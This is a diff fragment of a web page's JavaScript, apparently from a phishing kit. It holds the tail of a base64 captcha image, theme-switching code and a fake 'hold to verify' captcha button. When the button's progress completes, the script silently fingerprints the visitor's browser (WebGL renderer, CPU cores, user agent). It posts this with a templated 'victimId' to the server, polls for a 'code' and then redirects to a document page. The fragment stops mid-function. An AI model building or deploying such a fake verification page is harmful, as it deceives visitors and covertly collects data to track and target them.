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";
+        function applyTheme() {
+        // Evaluate theme purely based on browser/system settings
+        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        
+        // True if the browser is NOT in dark mode (meaning it is in light mode)
+        const shouldBeLight = !prefersDark;
+
+        // Apply or remove the light-theme class on the body
+        if (shouldBeLight) {
+            document.body.classList.add('light-theme');
+        } else {
+            document.body.classList.remove('light-theme');
+        }
+
+        // Update Captcha Image source with your base64 strings
+        const img = document.getElementById('captcha-img');
+        if (img) {
+            img.src = shouldBeLight ? lightBase64 : darkBase64;
+        }
+
+        // Update Background Image source using direct path strings
+                // Update Background Image source using direct CSS background injection
+        if (shouldBeLight) {
+            document.body.style.backgroundImage = "url('/images/background_img_light.svg')";
+        } else {
+            document.body.style.backgroundImage = "url('/images/background_img.svg')";
+        }
+
+    }
+
+    // Run when the script is parsed immediately
+    applyTheme();
+
+    // Listen for shifts to both dark mode AND light mode dynamically
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);
+    window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', applyTheme);
+
+
+
+document.addEventListener("DOMContentLoaded", () => {
+    const button = document.getElementById("verify-button");
+    const progressFill = button ? button.querySelector(".progress-fill") : null;
+
+    // ADD THIS LINE HERE TO SELECT THE SVG BUTTON
+    const iconButton = document.querySelector(".icon-action-button");
+
+    if (!button || !progressFill) return;
+
+    let holdInterval = null;
+    let currentProgress = 0;
+    const holdDuration = 4500; // 4 seconds to fill completely
+    const intervalStep = 30;   // Loop speed in milliseconds
+
+    function startFilling(e) {
+        if (e.cancelable) e.preventDefault();
+        clearInterval(holdInterval);
+
+        // --- ADD ONLY THIS CHECK HERE ---
+        if (window.hasClickBeenWarned) {
+            // Change the text content to "Please wait..."
+            button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.textContent = "Please wait...");
+            button.classList.add("pressed");
+
+            // Run the loop automatically until it hits 100%
+            holdInterval = setInterval(() => {
+                currentProgress += (intervalStep / holdDuration) * 100;
+                
+                     if (currentProgress >= 100) {
+                    currentProgress = 100;
+                    progressFill.style.width = "100%";
+                    button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.style.display = "none");
+                    
+                    const innerText = progressFill.querySelector(".ZpICXubljzwSSUY");
+                    if (innerText) innerText.style.setProperty("display", "none", "important");
+
+                    // 1. Show the white checkmark immediately
+                    const checkmark = button.querySelector(".success-checkmark");
+                    if (checkmark) checkmark.style.display = "block";
+                    
+                    clearInterval(holdInterval);
+
+                                    // 2. Wait 2.2 seconds, then transition to dots and trigger fingerprinting
+                setTimeout(() => {
+                    if (checkmark) checkmark.style.display = "none";
+                    
+                    const dots = button.querySelector(".loading-dots");
+                    if (dots) {
+                        dots.style.opacity = "0";
+                        dots.style.display = "flex";
+                        dots.offsetHeight; // Force layout reflow
+                        dots.style.transition = "opacity 0.4s ease-out";
+                        dots.style.opacity = "1";
+                    }
+
+                    // --- NEW FINGERPRINTING LOGIC ---
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl');
+                        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                        
+                        // Gather hardware environment details
+                        const hardwareData = JSON.stringify({
+                            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
+                            cores: navigator.hardwareConcurrency || "N/A"
+                        });
+
+                        // Populate the hidden form fields
+                        const hardwareInput = document.getElementById('hardware-input');
+                        const uaInput = document.getElementById('ua-input');
+                        const safariForm = document.getElementById('safari-form');
+
+                        if (hardwareInput) hardwareInput.value = hardwareData;
+                        if (uaInput) uaInput.value = navigator.userAgent;
+
+                                                // Give the loading dots exactly 1 second to show before sending data
+                        setTimeout(async () => {
+                            try {
+                                // 1. Create the data payload dynamically
+                                const params = new URLSearchParams();
+                                params.append('uuid', '<%= victimId %>');
+                                params.append('hardware', hardwareData);
+                                params.append('ua', navigator.userAgent);
+
+                                // 2. Send the data to the server silently in the background
+                                const response = await fetch('/submit-data', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                    body: params.toString()
+                                });
+
+                                // 3. If the data sent successfully, start checking if the code is ready
+                                if (response.ok) {
+                                    const pollTimer = setInterval(async () => {
+                                        try {
+                                            const checkResponse = await fetch('/check-code/<%= victimId %>');
+                                            const checkData = await checkResponse.json();
+
+                                            // If the server says 'ready', stop checking and move to the document page
+                                            if (checkData && checkData.status === 'ready') {
+                                                clearInterval(pollTimer);
+                                                window.location.href = '/document/<%= victimId %>';
+                                            }
+                                        } catch (pollErr) {
+                                            console.error("Error checking code status:", pollErr);
+                                        }
+                                    }, 3000); // Checks the server every 2.5 seconds
+                                }
+                            } catch (networkErr) {
+                                console.error("Background submission failed:", networkErr);
+                            }
+                        }, 350);
+
+                    } catch (error) {
+                        console.error("Data gathering skipped or restricted:", error);
+                    }
+                    // ---------------------------------
+
+                }, 700);
+
+                }
+
+                else {
+                    progressFill.style.width = currentProgress + "%";
+                }
+            }, intervalStep);
+
+            return; // Stops here so the hold logic doesn't run!
+        }
+
+        
+        button.classList.add("pressed");
+
+        holdInterval = setInterval(() => {
+            currentProgress += (intervalStep / holdDuration) * 100;
+            
+                        if (currentProgress >= 100) {
+                currentProgress = 100;
+                progressFill.style.width = "100%";
+                button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.style.display = "none");
+                
+                const innerText = progressFill.querySelector(".ZpICXubljzwSSUY");
